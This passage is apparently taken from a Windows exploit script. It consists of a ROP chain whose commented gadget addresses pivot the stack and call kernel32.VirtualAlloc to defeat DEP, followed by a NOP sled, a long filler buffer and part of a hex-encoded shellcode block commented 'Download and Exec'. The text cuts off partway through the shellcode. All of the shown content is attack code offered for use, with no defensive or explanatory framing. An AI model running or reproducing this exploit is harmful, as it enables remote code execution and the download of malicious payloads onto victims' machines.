rop1 += &quot;56565656&quot; # PADDING
rop1 += &quot;57575757&quot; # PADDING
rop1 += &quot;58585858&quot; # PADDING
rop1 += &quot;41414141&quot; # PADDING
rop1 += &quot;eaad5927&quot; # 0X2759ADEA # DEC ECX # RETN
rop1 += &quot;eaad5927&quot; # 0X2759ADEA # DEC ECX # RETN
rop1 += &quot;eaad5927&quot; # 0X2759ADEA # DEC ECX # RETN
rop1 += &quot;eaad5927&quot; # 0X2759ADEA # DEC ECX # RETN
rop1 += &quot;eaad5927&quot; # 0X2759ADEA # DEC ECX # RETN
rop1 += &quot;32ad5827&quot; # 0x2758AD32 # POP ESI # RETN
rop1 += &quot;14010000&quot; # PADDING
rop1 += &quot;4d2d5f27&quot; # 0X275F2D4D # ADD EAX,ESI # POP ESI # RETN 8
rop1 += &quot;b6b35a27&quot; # 0X275AB3B6 # MOV DWORD PTR DS:[ECX+2C],EAX # RETN 4
rop1 += &quot;b6b35a27&quot; # 0X275AB3B6 # MOV DWORD PTR DS:[ECX+2C],EAX # RETN 4

#--------------------     Setting 2nd Parameter   --------------------------------------#
rop2  = &quot;41414141&quot;  # PADDING
rop2 += &quot;42424242&quot;  # PADDING
rop2 += &quot;eaad5927&quot;  # 0X2759ADEA # DEC ECX # RETN
rop2 += &quot;eaad5927&quot;  # 0X2759ADEA # DEC ECX # RETN
rop2 += &quot;eaad5927&quot;  # 0X2759ADEA # DEC ECX # RETN
rop2 += &quot;eaad5927&quot;  # 0X2759ADEA # DEC ECX # RETN
rop2 += &quot;eaad5927&quot;  # 0X2759ADEA # DEC ECX # RETN
rop2 += &quot;b6b35a27&quot;  # 0X275AB3B6 # MOV DWORD PTR DS:[ECX+2C],EAX # RETN 4

#------------------------- Fetch &amp; Call VirtualAlloc() address  ----------------------#
rop2 += &quot;a40d5927&quot;  # 0X27590DA4 # POP EAX # RETN
rop2 += &quot;c8115827&quot;  #  0X275811C8 # kernel32.VirtualAlloc
rop2 += &quot;c8115827&quot;  #  0X275811C8 # kernel32.VirtualAlloc
rop2 += &quot;6c0b5e27&quot;  # 0X275E0B6C # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop2 += &quot;46ea5927&quot;  # 0X2759EA46 # XCHG EAX,EDI # RETN
rop2 += &quot;c21a5827&quot;  # 0X27581AC2 # XCHG EAX,EDX # RETN
rop2 += &quot;32ad5827&quot;  # 0X2758AD32 # POP ESI # RETN
rop2 += &quot;20000000&quot;  # PADDING
rop2 += &quot;4d2d5f27&quot;  # 0X275F2D4D # ADD EAX,ESI # POP ESI # RETN 8
rop2 += &quot;42424242&quot;
rop2 += &quot;ee8b5927&quot;  # 0X27598BEE # XCHG EAX,ESP # RETN


nops = &quot;90&quot; * 150 

footer = (
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x0D\x0A\x7D\x0D\x0A\x7D\x0D\x0A\x7D&quot;

)

# shellcode Download and Exec
shell1 = (
&quot;\x65\x62\x37\x35\x33\x33\x63\x39\x36\x34\x38\x62\x37\x31\x33\x30\x38\x62\x37\x36\x30\x63\x38\x62\x37\x36\x31\x63\x38\x62\x35\x65\x30\x38\x38\x62\x37\x65\x32&quot;
&quot;\x30\x38\x62\x33\x36\x36\x36\x33\x39\x34\x66\x31\x38\x37\x35\x66\x32\x63\x33\x36\x30\x38\x62\x36\x63\x32\x34\x32\x34\x38\x62\x34\x35\x33\x63\x38\x62\x35\x34&quot;
&quot;\x32\x38\x37\x38\x30\x33\x64\x35\x38\x62\x34\x61\x31\x38\x38\x62\x35\x61\x32\x30\x30\x33\x64\x64\x65\x33\x33\x34\x34\x39\x38\x62\x33\x34\x38\x62\x30\x33\x66&quot;
&quot;\x35\x33\x33\x66\x66\x33\x33\x63\x30\x66\x63\x61\x63\x38\x34\x63\x30\x37\x34\x30\x37\x63\x31\x63\x66\x30\x64\x30\x33\x66\x38\x65\x62\x66\x34\x33\x62\x37\x63&quot;
&quot;\x32\x34\x32\x38\x37\x35\x65\x31\x38\x62\x35\x61\x32\x34\x30\x33\x64\x64\x36\x36\x38\x62\x30\x63\x34\x62\x38\x62\x35\x61\x31\x63\x30\x33\x64\x64\x38\x62\x30&quot;
&quot;\x34\x38\x62\x30\x33\x63\x35\x38\x39\x34\x34\x32\x34\x31\x63\x36\x31\x63\x33\x65\x38\x39\x32\x66\x66\x66\x66\x66\x66\x35\x38\x38\x62\x65\x38\x33\x33\x63\x30&quot;
&quot;\x65\x62\x30\x35\x65\x38\x65\x66\x66\x66\x66\x66\x66\x66\x38\x62\x66\x64\x38\x33\x65\x66\x38\x61\x38\x62\x66\x37\x34\x36\x33\x38\x30\x65\x37\x35\x66\x62\x34&quot;
&quot;\x65\x38\x30\x33\x65\x32\x66\x37\x35\x66\x61\x34\x36\x38\x31\x65\x64\x34\x35\x66\x66\x66\x66\x66\x66\x36\x38\x33\x33\x63\x61\x38\x61\x35\x62\x35\x33\x65\x38&quot;
&quot;\x37\x64\x66\x66\x66\x66\x66\x66\x35\x35\x36\x61\x36\x34\x66\x66\x64\x30\x35\x37\x38\x62\x66\x38\x30\x33\x66\x64\x61\x34\x38\x30\x37\x66\x66\x66\x30\x30\x37&quot;
&quot;\x35\x66\x39\x35\x66\x36\x38\x38\x65\x34\x65\x30\x65\x65\x63\x35\x33\x65\x38\x36\x30\x66\x66\x66\x66\x66\x66\x33\x33\x63\x39\x36\x36\x62\x39\x36\x66\x36\x65&quot;
&quot;\x35\x31\x36\x38\x37\x35\x37\x32\x36\x63\x36\x64\x35\x34\x66\x66\x64\x30\x36\x38\x33\x36\x31\x61\x32\x66\x37\x30\x35\x30\x65\x38\x34\x36\x66\x66\x66\x66\x66&quot;
